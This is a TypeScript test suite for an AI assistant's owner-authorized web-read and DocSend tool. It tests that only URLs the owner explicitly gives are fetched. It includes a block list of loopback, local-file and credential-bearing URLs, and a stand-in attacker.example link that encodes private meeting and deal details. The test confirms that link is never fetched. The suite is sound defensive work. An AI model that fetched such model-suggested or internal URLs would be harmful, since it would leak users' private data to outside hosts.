import test from 'node:test';
import {createHash} from 'node:crypto';
import assert from 'node:assert/strict';
import {mkdtempSync,rmSync} from 'node:fs';
import {tmpdir} from 'node:os';
import {join} from 'node:path';
import {OperationalJournal} from '../src/journal/index.js';
import {ConversationCoordinator} from '../src/conversation.js';
import {createOwnerWebReadClient,createWebReadCommand,ownerWebReadKind,ownerWebReadUrlMatches,validWebReadUrl,normalizeDocSendUrl,docsendReviewText,ownerWebReadArgsSchema,webReadReceiptMatches,webReadAdmissionMatches} from '../src/tools/owner-web-read.js';
import {stableActionIdentity} from '../src/tools/action-gate.js';
const identity={tenant_id:'tenant',channel:'photon' as const,account_id:'account',owner_id:'owner',line_key:'line',target:'photon' as const,route_mode:'fixed' as const,route_id:'thread',project_fingerprint:'a'.repeat(64)};
const policy={channel:'photon' as const,accountId:'account',ownerId:'owner'};
const context={threadId:'thread',destination:'photon',lineKey:'line'};
const authority={read:async()=>({version:2 as const,complete:false,revision:null,bridge_sources:[],google_sources:[]})};
const inbound=(eventId:string,text:string)=>({eventId,text,channel:'photon' as const,accountId:'account',senderId:'owner',isDirect:true});
const url='https://example.com/page';
test('an owner question permits omitting only its empty query delimiter, preserving exact legacy arguments',()=>{
  assert.ok(ownerWebReadUrlMatches('Quick summary of '+url+'?',url));
  assert.ok(ownerWebReadUrlMatches('Quick summary of <'+url+'?>',url));
  assert.ok(ownerWebReadUrlMatches('Quick summary of '+url+'?',url+'?'));
  assert.ok(!ownerWebReadUrlMatches('Read '+url,url+'?'));
  for(const suffix of ['?why?', '?q=why?', '??', '#section?', '?q=%3F', '%3F']) {
    assert.ok(ownerWebReadUrlMatches('Read '+url+suffix,url+suffix));
    assert.ok(!ownerWebReadUrlMatches('Read '+url+suffix,url));
    if(suffix.endsWith('?'))assert.ok(!ownerWebReadUrlMatches('Read '+url+suffix,(url+suffix).slice(0,-1)));
  }
  assert.ok(!ownerWebReadUrlMatches('Read '+url+'/other?',url));
  const reply_target={accepted_dispatch_id:'accepted',provider_message_id:'message',text:'Read '+url+'?',source_revision:'a'.repeat(64)};
  assert.ok(webReadAdmissionMatches('Please summarize it',{url,source_revision:reply_target.source_revision,reply_target}));
  assert.ok(!webReadAdmissionMatches('Read https://elsewhere.com',{url,source_revision:reply_target.source_revision,reply_target}));
});
test('URL selection is one complete owner token, never prefix/model URL, DocSend, local or userinfo',()=>{
  assert.ok(ownerWebReadUrlMatches('Read '+url,url));
  assert.ok(!ownerWebReadUrlMatches('Read '+url+'/other',url));
  assert.ok(!ownerWebReadUrlMatches('Read https://example.com/?next='+url,url));
  assert.ok(ownerWebReadUrlMatches('(HTTPS://example.com/a(b)).','HTTPS://example.com/a(b)'));
  assert.ok(ownerWebReadUrlMatches('https://example.com/path).,','https://example.com/path'));
  assert.ok(ownerWebReadUrlMatches('https://example.com/q?x=1,2','https://example.com/q?x=1,2'));
  for(const value of ['http://2130706433','http://0177.0.0.1','http://0x7f000001','https://singlelabel/a','file:///tmp/a','https://localhost/a','https://127.0.0.1/a','https://[::1]/a','https://name:secret@example.com/a','https://docsend.com/view/a'])assert.ok(!validWebReadUrl(value));
});
for(const selected of [url,url+'?'])test('question punctuation keeps exact selected receipt URL '+selected,async()=>{
  const eventId='a'.repeat(64),args={url:selected,source_revision:null},binding=stableActionIdentity(eventId,ownerWebReadKind,args);
  const ownerText='Quick summary of '+url+'?';let wrongUrl=false;
  const client=createOwnerWebReadClient({identity,bridgeUrl:'http://127.0.0.1:8080/mcp',bearer:'c'.repeat(64),fetch:async(_input,init)=>{
    const body=JSON.parse(String(init!.body));assert.deepEqual(body.args,args);
    assert.equal(body.text_hash,createHash('sha256').update(ownerText).digest('hex'));
    return new Response(JSON.stringify({version:1,status:'committed',action_id:binding.actionId,event_id:eventId,payload_hash:'b'.repeat(64),args_hash:binding.payloadHash,
      outcome:{operation:'read',result:{url:wrongUrl?(selected===url?url+'?':url):selected,title:'Page',text:'Actual evidence',provider:'exa'}}}));
  }});
  const request={actionId:binding.actionId,eventId,payloadHash:'b'.repeat(64),text:ownerText,admittedAtMs:Date.now(),providerThreadId:'thread',args};
  assert.equal((await client.call('inspect',request)).status,'committed');
  wrongUrl=true;await assert.rejects(client.call('inspect',request),/receipt is invalid/);
});
test('paid read loss is inspect-only across reopen; null public context allows same attending evidence and safe other chat',async()=>{
  const folder=mkdtempSync(join(tmpdir(),'web-read-'));
  const ownerText='Read '+url+'?';
  let journal=new OperationalJournal(join(folder,'journal.sqlite')),blocked=true,calls=0;
  const receipts=new Map<string,unknown>();
  const client=createOwnerWebReadClient({identity,bridgeUrl:'http://127.0.0.1:8080/mcp',bearer:'c'.repeat(64),fetch:async(_input,init)=>{
    const body=JSON.parse(String(init!.body));
    assert.equal(body.text,ownerText);assert.equal(body.text_hash,createHash('sha256').update(ownerText).digest('hex'));assert.equal(body.args.url,url);
    if(body.operation==='inspect'){if(blocked)throw new Error('unavailable');return new Response(JSON.stringify(receipts.get(body.action_id)));}
    calls++;assert.equal(body.args.source_revision,null);
    receipts.set(body.action_id,{version:1,status:'committed',action_id:body.action_id,event_id:body.event_id,payload_hash:body.payload_hash,args_hash:stableActionIdentity(body.event_id,ownerWebReadKind,body.args).payloadHash,
      outcome:{operation:'read',result:{url,title:'Cedar page',text:'Actual returned Cedar page evidence.',provider:'exa'}}});
    throw new Error('lost response');
  }});
  const command=createWebReadCommand({client,journal:()=>journal,sourceAuthority:authority});
  const sent:string[]=[];
  let coordinator=new ConversationCoordinator({journal,ownerPolicy:policy,ownerWebRead:client,model:{generate:async request=>{
    await command({id:'web-read',args:['--url',url],mode:'chat'},{mode:'chat',runId:request.runId,ownerRequestKey:request.ownerRequestKey,allowOwnerSkill:request.allowOwnerSkill,signal:request.signal});
    const action=journal.db.prepare('SELECT * FROM actions WHERE kind=?').get(ownerWebReadKind)!;
    assert.throws(()=>journal.prepareOwnerWebReadAction({runId:request.runId,accountId:'account',ownerId:'owner',lineKey:'line',channel:'photon',scopeHash:client.scopeHash},action.source_event_id as string,{url,source_revision:'d'.repeat(64)}),/conflicts/);
    return 'invented answer';}},postPrepared:async request=>{assert.match(request.text,/^I couldn’t confirm whether the URL read happened\./);sent.push(request.text);return {acceptance:'accepted',messageId:'original-read-notice'};}});
  try {
    assert.equal((await coordinator.receive(inbound('read',ownerText),context)).status,'held');
    const action=journal.db.prepare('SELECT * FROM actions WHERE kind=?').get(ownerWebReadKind)!;
    assert.equal(action.status,'unknown');
    assert.equal(sent.length,1); assert.match(sent[0]!,/^I couldn’t confirm whether the URL read happened\./);
    await coordinator.close();journal.close();journal=new OperationalJournal(join(folder,'journal.sqlite'));journal.recoverInterrupted();
    coordinator=new ConversationCoordinator({journal,ownerPolicy:policy,ownerWebRead:client,model:{generate:async request=>{
      if(request.text==='Hello'){assert.equal(request.recoveredWebReads?.length,0);return 'Safe hello';}
      assert.equal(request.text,ownerText);assert.equal(request.recoveredWebReads?.[0]?.sourceRevision,null);assert.match(JSON.stringify(request.recoveredWebReads),/Actual returned Cedar/);return 'The page contains Cedar evidence';
    }},postPrepared:async request=>{sent.push(request.text);return {acceptance:'accepted',messageId:`reply-${sent.length}`};}});
    assert.equal((await coordinator.recover())[0]?.status,'held');
    assert.equal((await coordinator.receive(inbound('hello','Hello'),context)).status,'accepted');
    blocked=false;journal.db.prepare('UPDATE actions SET updated_at=updated_at-61000 WHERE id=?').run(action.id);
    assert.equal((await coordinator.recover())[0]?.status,'accepted');
    assert.equal(calls,1);assert.deepEqual(sent.slice(1),['Safe hello','The page contains Cedar evidence']);
    assert.equal((await coordinator.receive(inbound('read',ownerText),context)).status,'duplicate');
  }finally{await coordinator.close();journal.close();rmSync(folder,{recursive:true,force:true});}
});

test('Unicode completed page receipt retains original codepoint bounds on ASCII-escaped wire',async()=>{
 const result={url,title:'😀'.repeat(200),text:'😀'.repeat(8000),provider:'exa' as const};
 const eventId='a'.repeat(64),payloadHash='b'.repeat(64),args={url,source_revision:null};
 const binding=stableActionIdentity(eventId,ownerWebReadKind,args);
 const client=createOwnerWebReadClient({identity,bridgeUrl:'http://127.0.0.1:8080/mcp',bearer:'c'.repeat(64),fetch:async()=>{
  const json=JSON.stringify({version:1,status:'committed',action_id:binding.actionId,event_id:eventId,payload_hash:payloadHash,args_hash:binding.payloadHash,outcome:{operation:'read',result}}).replace(/[\u0080-\uffff]/g,char=>'\\u'+char.charCodeAt(0).toString(16).padStart(4,'0'));
  assert.ok(Buffer.byteLength(json)>65536);return new Response(json);
 }});
 const response=await client.call('inspect',{actionId:binding.actionId,eventId,payloadHash,text:'Read '+url,admittedAtMs:Date.now(),providerThreadId:'thread',args});
 assert.equal(response.status,'committed');if(response.status==='committed')assert.equal('text' in response.outcome.result?response.outcome.result.text:undefined,result.text);
});

test('coalesced or projected input cannot create a paid read',async()=>{
 const folder=mkdtempSync(join(tmpdir(),'web-read-gate-')),journal=new OperationalJournal(join(folder,'journal.sqlite'));
 let contacts=0;
 const client=createOwnerWebReadClient({identity,bridgeUrl:'http://127.0.0.1:8080/mcp',bearer:'c'.repeat(64),fetch:async()=>{contacts++;throw new Error('no contact');}});
 const command=createWebReadCommand({client,journal:()=>journal,sourceAuthority:authority});
 try {
  await assert.rejects(command({id:'web-read',args:['--url',url],mode:'chat'},{mode:'chat',runId:'run',ownerRequestKey:'event',allowOwnerSkill:false}));
  assert.equal(contacts,0);assert.equal(journal.db.prepare('SELECT count(*) AS n FROM actions').get()!.n,0);
 }finally{journal.close();rmSync(folder,{recursive:true,force:true});}
});

test('completed evidence unavailable after source change holds only original input while Hello proceeds',async()=>{
 const folder=mkdtempSync(join(tmpdir(),'web-read-source-change-')),journal=new OperationalJournal(join(folder,'journal.sqlite'));
 let changed=false,calls=0;
 const client=createOwnerWebReadClient({identity,bridgeUrl:'http://127.0.0.1:8080/mcp',bearer:'c'.repeat(64),fetch:async(_input,init)=>{
  const body=JSON.parse(String(init!.body));
  if(body.operation==='inspect'&&changed)return new Response(JSON.stringify({version:1,status:'rejected',code:'source_unavailable'}),{status:409});
  if(body.operation==='execute')calls++;
  return new Response(JSON.stringify({version:1,status:'committed',action_id:body.action_id,event_id:body.event_id,payload_hash:body.payload_hash,args_hash:stableActionIdentity(body.event_id,ownerWebReadKind,body.args).payloadHash,outcome:{operation:'read',result:{url,title:'Page',text:'Old page evidence',provider:'exa'}}}));
 }});
 const reader={read:async()=>changed?{version:2 as const,complete:true,revision:'d'.repeat(64),bridge_sources:[],google_sources:[]}:await authority.read()};
 const command=createWebReadCommand({client,journal:()=>journal,sourceAuthority:reader});
 let coordinator=new ConversationCoordinator({journal,ownerPolicy:policy,ownerWebRead:client,model:{generate:async request=>{
  await command({id:'web-read',args:['--url',url],mode:'chat'},{mode:'chat',runId:request.runId,ownerRequestKey:request.ownerRequestKey,allowOwnerSkill:true,signal:request.signal});changed=true;throw new Error('source changed before answer');
 }},postPrepared:async()=>{throw new Error('no answer');}});
 try{
  await coordinator.receive(inbound('read','Read '+url),context);
  assert.equal(journal.db.prepare('SELECT status FROM actions WHERE kind=?').get(ownerWebReadKind)!.status,'succeeded');
  await coordinator.close();
  coordinator=new ConversationCoordinator({journal,ownerPolicy:policy,ownerWebRead:client,model:{generate:async request=>{assert.equal(request.text,'Hello');assert.equal(request.recoveredWebReads?.length,0);return 'Safe hello';}},postPrepared:async()=>({acceptance:'accepted',messageId:'hello'})});
  assert.equal((await coordinator.receive(inbound('hello','Hello'),context)).status,'accepted');
  assert.equal(calls,1);assert.equal(journal.listPendingInbound().length,1);
 }finally{await coordinator.close();journal.close();rmSync(folder,{recursive:true,force:true});}
});

test('DocSend target normalization mirrors original reader while retaining query bytes',()=>{
  assert.equal(normalizeDocSendUrl('HTTP://Deck.DocSend.com/view/Cedar_1/?q=李%2f#page2'),'https://deck.docsend.com/view/Cedar_1?q=李%2f');
  assert.equal(normalizeDocSendUrl('https://docsend.com/view/a#part?ignored=1'),'https://docsend.com/view/a');
  for(const value of ['https://docsend.com.evil.com/view/a','https://user@docsend.com/view/a','https://docsend.com:443/view/a','https://docsend.com/view/a/other','https://docsend.com/view/','file://docsend.com/view/a'])assert.equal(normalizeDocSendUrl(value),null);
  assert.equal(normalizeDocSendUrl('https://docsend.com/view/a?#part'),'https://docsend.com/view/a');
  assert.equal(validWebReadUrl('https://docsend.com/view/a'),false);
});

const revision='a'.repeat(64),deck='http://docsend.com/view/Cedar_1/?x=1#page';
const completeAuthority={read:async()=>({version:2 as const,complete:true,revision,bridge_sources:[],google_sources:[]})};
test('declined direct DocSend requests never contact the receiver; a later owner request still reads',async()=>{
 const folder=mkdtempSync(join(tmpdir(),'docsend-cancelled-')),journal=new OperationalJournal(join(folder,'journal.sqlite'));let contacts=0;
 const client=createOwnerWebReadClient({identity,bridgeUrl:'http://127.0.0.1:8080/mcp',bearer:'c'.repeat(64),fetch:async(_input,init)=>{
  contacts++;const body=JSON.parse(String(init!.body));assert.equal(body.args.operation,'docsend');
  return Response.json({version:1,status:'committed',action_id:body.action_id,event_id:body.event_id,payload_hash:body.payload_hash,
   args_hash:stableActionIdentity(body.event_id,ownerWebReadKind,body.args).payloadHash,
   outcome:{operation:'docsend',result:{status:'ok',url:normalizeDocSendUrl(deck),title:'Cedar',pages:1,text:'Actual deck text',cached:false,pdf:''}}});
 }});
 const command=createWebReadCommand({client,journal:()=>journal,sourceAuthority:completeAuthority});
 const coordinator=new ConversationCoordinator({journal,ownerPolicy:policy,ownerWebRead:client,model:{generate:async request=>{
  const invoke=()=>command({id:'docsend-fetch',args:['--url',deck],mode:'chat'},
   {mode:'chat',runId:request.runId,ownerRequestKey:request.ownerRequestKey,allowOwnerSkill:true,sourceRevision:revision});
  if(request.text==='Read '+deck)await invoke();
  else await assert.rejects(invoke,/DocSend read is not authorized/);
  return 'Request handled.';
 }},postPrepared:async()=>({acceptance:'accepted',messageId:'reply'})});
 try{
  for(const [index,prefix] of ['Do not open ',"Don't read ", "dont open ", "Read without a passcode: ",'Skip '].entries()) {
   await coordinator.receive(inbound('declined-'+index,prefix+deck),context);
   assert.equal(contacts,0);assert.equal(journal.db.prepare('SELECT count(*) AS n FROM actions').get()!.n,0);
  }
  assert.equal((await coordinator.receive(inbound('allowed','Read '+deck),context)).status,'accepted');
  assert.equal(contacts,1);
 }finally{await coordinator.close();journal.close();rmSync(folder,{recursive:true,force:true});}
});
function deckPreview(body:Record<string,any>) {
 const {url,source_revision,fresh,passcode}=body.args;
 const content={operation:'docsend' as const,url,normalized_url:normalizeDocSendUrl(url)!,viewer_email:'owner@example.com',fresh,...(passcode===undefined?{}:{passcode}),source_revision};
 const review_hash=createHash('sha256').update(JSON.stringify(Object.fromEntries(Object.entries(content).sort(([a],[b])=>a<b?-1:a>b?1:0)))).digest('hex');
 return {version:1 as const,status:'preview' as const,event_id:body.event_id,payload_hash:body.payload_hash,review:{...content,review_hash}};
}
test('DocSend fresh review is exact and secret-free; distinct accepted yes alone executes frozen target',async()=>{
 const folder=mkdtempSync(join(tmpdir(),'docsend-review-')),journal=new OperationalJournal(join(folder,'journal.sqlite'));
 let previews=0,executes=0;const sent:string[]=[];
 const client=createOwnerWebReadClient({identity,bridgeUrl:'http://127.0.0.1:8080/mcp',bearer:'c'.repeat(64),fetch:async(_input,init)=>{
  const body=JSON.parse(String(init!.body));
  if(body.operation==='preview'){previews++;return new Response(JSON.stringify(deckPreview(body)));}
  assert.equal(body.operation,'execute');executes++;assert.equal(body.args.operation,'confirm_docsend');assert.equal(body.args.review.passcode,'secret123');
  return new Response(JSON.stringify({version:1,status:'committed',action_id:body.action_id,event_id:body.event_id,payload_hash:body.payload_hash,args_hash:stableActionIdentity(body.event_id,ownerWebReadKind,body.args).payloadHash,outcome:{operation:'docsend',result:{status:'ok',url:normalizeDocSendUrl(deck),title:'Cedar',pages:1,text:'Actual deck text',cached:false,pdf:'/api/decks/Cedar_1.pdf'}}}));
 }});
 const command=createWebReadCommand({client,journal:()=>journal,sourceAuthority:completeAuthority});
 const coordinator=new ConversationCoordinator({journal,ownerPolicy:policy,ownerWebRead:client,model:{generate:async request=>{
  const invocation=request.text==='Yes'?{id:'confirm-docsend',args:[],mode:'chat' as const}:{id:'docsend-fetch',args:['--url',deck,'--fresh','--passcode','secret123'],mode:'chat' as const};
  const result=await command(invocation,{mode:'chat',runId:request.runId,ownerRequestKey:request.ownerRequestKey,allowOwnerSkill:true,sourceRevision:revision,signal:request.signal});
  return 'review_text' in result.result?String(result.result.review_text):'Deck read';
 }},postPrepared:async request=>{sent.push(request.text);return {acceptance:'accepted',messageId:`reply-${sent.length}`};}});
 try{
  assert.equal((await coordinator.receive(inbound('preview',`Read ${deck} fresh with secret123`),context)).status,'accepted');
  assert.equal(executes,0);assert.equal(previews,1);assert.ok(!sent[0]!.includes('secret123'));assert.match(sent[0]!,/Open it again/);
  const action=journal.db.prepare('SELECT * FROM actions WHERE kind=?').get(ownerWebReadKind)!;
  const saved=journal.readOwnerWebReadAction(action.id as string,{accountId:'account',ownerId:'owner',lineKey:'line',channel:'photon',scopeHash:client.scopeHash});
  assert.equal(sent[0],docsendReviewText(saved.preview!));
  assert.equal((await coordinator.receive(inbound('yes','Yes'),context)).status,'accepted');assert.equal(executes,1);
  assert.equal((await coordinator.receive(inbound('yes','Yes'),context)).status,'duplicate');assert.equal(executes,1);
 }finally{await coordinator.close();journal.close();rmSync(folder,{recursive:true,force:true});}
});
test('DocSend read-only preview loss creates no held effect; unbound passcode and incomplete authority never contact',async()=>{
 const folder=mkdtempSync(join(tmpdir(),'docsend-preview-loss-')),journal=new OperationalJournal(join(folder,'journal.sqlite'));let calls=0;
 const client=createOwnerWebReadClient({identity,bridgeUrl:'http://127.0.0.1:8080/mcp',bearer:'c'.repeat(64),fetch:async()=>{calls++;throw new Error('lost readonly preview');}});
 const command=createWebReadCommand({client,journal:()=>journal,sourceAuthority:completeAuthority});
 const coordinator=new ConversationCoordinator({journal,ownerPolicy:policy,ownerWebRead:client,model:{generate:async request=>{
  const ctx={mode:'chat',runId:request.runId,ownerRequestKey:request.ownerRequestKey,allowOwnerSkill:true,sourceRevision:revision};
  await assert.rejects(command({id:'docsend-fetch',args:['--url',deck,'--fresh'],mode:'chat'},ctx));assert.equal(calls,1);assert.equal(journal.db.prepare('SELECT count(*) AS n FROM actions').get()!.n,0);
  await assert.rejects(command({id:'docsend-fetch',args:['--url',deck,'--passcode','invented'],mode:'chat'},ctx));assert.equal(calls,1);
  await assert.rejects(createWebReadCommand({client,journal:()=>journal,sourceAuthority:authority})({id:'docsend-fetch',args:['--url',deck],mode:'chat'},ctx));assert.equal(calls,1);return 'Review unavailable';
 }},postPrepared:async()=>({acceptance:'accepted',messageId:'reply'})});
 try {await coordinator.receive(inbound('preview-loss','Read fresh '+deck),context);}
 finally{await coordinator.close();journal.close();rmSync(folder,{recursive:true,force:true});}
});

test('ordinary web evidence cannot become a DocSend confirmation question',async()=>{
 const folder=mkdtempSync(join(tmpdir(),'docsend-family-')),journal=new OperationalJournal(join(folder,'journal.sqlite'));let contacts=0,denied=0;
 const client=createOwnerWebReadClient({identity,bridgeUrl:'http://127.0.0.1:8080/mcp',bearer:'c'.repeat(64),fetch:async(_input,init)=>{
  contacts++;const body=JSON.parse(String(init!.body));return new Response(JSON.stringify({version:1,status:'committed',action_id:body.action_id,event_id:body.event_id,payload_hash:body.payload_hash,args_hash:stableActionIdentity(body.event_id,ownerWebReadKind,body.args).payloadHash,outcome:{operation:'read',result:{url,title:'Page',text:'Actual page',provider:'exa'}}}));
 }});
 const command=createWebReadCommand({client,journal:()=>journal,sourceAuthority:completeAuthority});
 const coordinator=new ConversationCoordinator({journal,ownerPolicy:policy,ownerWebRead:client,model:{generate:async request=>{
  const ctx={mode:'chat',runId:request.runId,ownerRequestKey:request.ownerRequestKey,allowOwnerSkill:true,sourceRevision:revision};
  if(request.text==='Yes'){await assert.rejects(command({id:'confirm-docsend',args:[],mode:'chat'},ctx));denied++;return 'Please request a deck.';}
  await command({id:'web-read',args:['--url',url],mode:'chat'},ctx);return 'Ordinary page answer';
 }},postPrepared:async()=>({acceptance:'accepted',messageId:'reply'})});
 try{await coordinator.receive(inbound('ordinary','Read '+url),context);await coordinator.receive(inbound('yes','Yes'),context);assert.equal(contacts,1);assert.equal(denied,1);}
 finally{await coordinator.close();journal.close();rmSync(folder,{recursive:true,force:true});}
});

for(const scenario of ['valid','repeated','ambiguous','unaccepted','wrong_thread','current_other','current_invalid','stale','incomplete','oversize'] as const)test(`ordinary explicit reply URL ${scenario} uses exact saved acceptance or refuses before contact`,async()=>{
 const folder=mkdtempSync(join(tmpdir(),'reply-url-')),journal=new OperationalJournal(join(folder,'journal.sqlite')),revision='a'.repeat(64);let contacts=0,denied=0,posts=0,denial='';
 const quoted=scenario==='oversize'?'李'.repeat(15000)+' '+url:scenario==='ambiguous'?url+' https://other.example/page':scenario==='repeated'?url+' '+url:'Read '+url;
 const client=createOwnerWebReadClient({identity,bridgeUrl:'http://127.0.0.1:8080/mcp',bearer:'c'.repeat(64),fetch:async(_input,init)=>{contacts++;const body=JSON.parse(String(init!.body));assert.equal(body.text.startsWith('Read'),true);assert.equal(body.args.reply_target.text,quoted);assert.equal(body.args.reply_target.provider_message_id,'quoted');return new Response(JSON.stringify({version:1,status:'committed',action_id:body.action_id,event_id:body.event_id,payload_hash:body.payload_hash,args_hash:stableActionIdentity(body.event_id,ownerWebReadKind,body.args).payloadHash,outcome:{operation:'read',result:{url,title:'Original page',text:'Actual evidence',provider:'exa'}}}));}});
 const sourceAuthority={read:async()=>({version:2 as const,complete:scenario!=='incomplete',revision:scenario==='stale'?'b'.repeat(64):revision,bridge_sources:[],google_sources:[]})};
 const command=createWebReadCommand({client,journal:()=>journal,sourceAuthority});
 const c=new ConversationCoordinator({journal,ownerPolicy:policy,ownerWebRead:client,model:{generate:async r=>{if(r.text==='Give me a link')return {text:quoted,sourceRevision:revision};try{await command({id:'web-read',args:['--url',url],mode:'chat'},{mode:'chat',runId:r.runId,ownerRequestKey:r.ownerRequestKey,allowOwnerSkill:r.allowOwnerSkill,sourceRevision:revision,signal:r.signal});}catch(error){denied++;denial=String(error);}return {text:'Finished read or clarified unavailable link.',sourceRevision:revision};}},postPrepared:async()=>({acceptance:scenario==='unaccepted'?'rejected':'accepted',messageId:++posts===1?'quoted':'later-reply'})});
 try{await c.receive(inbound('seed','Give me a link'),context);const text=scenario==='oversize'?'Read '+ '李'.repeat(15000):scenario==='current_other'?'Read https://other.example/page':scenario==='current_invalid'?'Read https://127.0.0.1/page':'Read this please';await c.receive({...inbound('read',text),replyBound:true,replyToMessageId:'quoted'},scenario==='wrong_thread'?{...context,threadId:'other'}:context);const success=scenario==='valid'||scenario==='repeated';assert.equal(contacts,success?1:0);assert.equal(journal.db.prepare('SELECT count(*) AS n FROM actions').get()!.n,success?1:0);if(success){const action=journal.db.prepare('SELECT id FROM actions').get()!;const saved=journal.readOwnerWebReadAction(action.id as string,{accountId:'account',ownerId:'owner',lineKey:'line',channel:'photon',scopeHash:client.scopeHash});assert.ok(!('operation' in saved.request.args)&&saved.request.args.reply_target);assert.equal(saved.status,'succeeded');if(scenario==='valid'&&!('operation' in saved.request.args)){journal.db.prepare("UPDATE prepared_replies SET payload=payload||' altered' WHERE dispatch_id=?").run(saved.request.args.reply_target!.accepted_dispatch_id);assert.throws(()=>journal.readOwnerWebReadAction(action.id as string,{accountId:'account',ownerId:'owner',lineKey:'line',channel:'photon',scopeHash:client.scopeHash}),/binding/);}}else{assert.equal(denied,1);if(scenario==='oversize')assert.match(denial,/request capacity/);}
 }finally{await c.close();journal.close();rmSync(folder,{recursive:true,force:true});}
});

for(const scenario of ['multi-turn','other-url','revoked','new','route','unaccepted'] as const)
test(`unquoted URL follow-up uses accepted conversation: ${scenario}`,async()=>{
 const folder=mkdtempSync(join(tmpdir(),'context-url-')),journal=new OperationalJournal(join(folder,'journal.sqlite'));
 let contacts=0,currentRevision=revision;
 const client=createOwnerWebReadClient({identity,bridgeUrl:'http://127.0.0.1:8080/mcp',bearer:'c'.repeat(64),fetch:async(_input,init)=>{
  contacts++;const body=JSON.parse(String(init!.body));
  assert.equal(body.args.reply_target.text,'about Cedar '+url);
  return Response.json({version:1,status:'committed',action_id:body.action_id,event_id:body.event_id,payload_hash:body.payload_hash,
   args_hash:stableActionIdentity(body.event_id,ownerWebReadKind,body.args).payloadHash,outcome:{operation:'read',result:{url,title:'Page',text:'Evidence',provider:'exa'}}});
 }});
 const command=createWebReadCommand({client,journal:()=>journal,sourceAuthority:{read:async()=>({version:2,complete:true,revision:currentRevision,bridge_sources:[],google_sources:[]})}});
 const c=new ConversationCoordinator({journal,ownerPolicy:policy,ownerWebRead:client,model:{generate:async r=>{
  if(r.text==='about Cedar '+url)return {text:'Cedar website: '+url,sourceRevision:revision};
  if(r.text==='shorter')return {text:'Cedar builds tools.',sourceRevision:revision};
  const read=()=>command({id:'web-read',args:['--url',scenario==='other-url'?'https://invented.example/':url],mode:'chat'},
   {mode:'chat',runId:r.runId,ownerRequestKey:r.ownerRequestKey,allowOwnerSkill:r.allowOwnerSkill,sourceRevision:currentRevision});
  if(scenario==='multi-turn')await read();else await assert.rejects(read);
  return {text:'Complete',sourceRevision:currentRevision};
 }},postPrepared:async()=>({acceptance:'accepted',messageId:'provider-id'})});
 try{
  await c.receive(inbound('seed','about Cedar '+url),context);
  await c.receive(inbound('edit','shorter'),context);
  if(scenario==='revoked')currentRevision='b'.repeat(64);
  if(scenario==='new')await c.receive(inbound('reset','/new'),context);
  if(scenario==='unaccepted')journal.db.exec("UPDATE dispatches SET status='unknown'");
  const next=scenario==='route'?{...context,destination:'other'}:context;
  await c.receive(inbound('read','their website too?'),next);
  assert.equal(contacts,scenario==='multi-turn'?1:0);
  if(contacts){await c.receive(inbound('read','their website too?'),next);assert.equal(contacts,1);}
 }finally{await c.close();journal.close();rmSync(folder,{recursive:true,force:true});}
});

for(const mode of ['thanks','request','cancel','thirty-turns','multiple-urls'] as const)
test(`unquoted assistant links never authorize egress: ${mode}`,async()=>{
 const folder=mkdtempSync(join(tmpdir(),'url-egress-')),journal=new OperationalJournal(join(folder,'journal.sqlite'));
 const leak='https://attacker.example/c?d=lunch-with-Dana-Reed-Thu-2pm-term-sheet-12M';let attempt=false,contacts=0;
 const client=createOwnerWebReadClient({identity,bridgeUrl:'http://127.0.0.1:8080/mcp',bearer:'c'.repeat(64),fetch:async()=>{contacts++;throw new Error('Unrequested egress');}});
 const command=createWebReadCommand({client,journal:()=>journal,sourceAuthority:{read:async()=>({version:2,complete:true,revision,bridge_sources:[],google_sources:[]})}});
 const c=new ConversationCoordinator({journal,ownerPolicy:policy,ownerWebRead:client,model:{generate:async r=>{
  if(attempt)await assert.rejects(()=>command({id:'web-read',args:['--url',leak],mode:'chat'},
    {mode:'chat',runId:r.runId,ownerRequestKey:r.ownerRequestKey,allowOwnerSkill:true,sourceRevision:revision}));
  return {text:'A page suggested '+leak+(mode==='multiple-urls'?' and https://second.example/':''),sourceRevision:revision};
 }},postPrepared:async()=>({acceptance:'accepted',messageId:'accepted'})});
 try{
  await c.receive(inbound('seed','hi'),context);
  if(mode==='cancel')await c.receive(inbound('cancel',"don't open that link"),context);
  if(mode==='thirty-turns')for(let i=0;i<30;i++)await c.receive(inbound('other-'+i,'ok'),context);
  attempt=true;await c.receive(inbound('read',mode==='request'?'check that link':'thanks'),context);
  assert.equal(contacts,0);assert.equal(journal.db.prepare('SELECT count(*) n FROM actions').get()!.n,0);
 }finally{await c.close();journal.close();rmSync(folder,{recursive:true,force:true});}
});
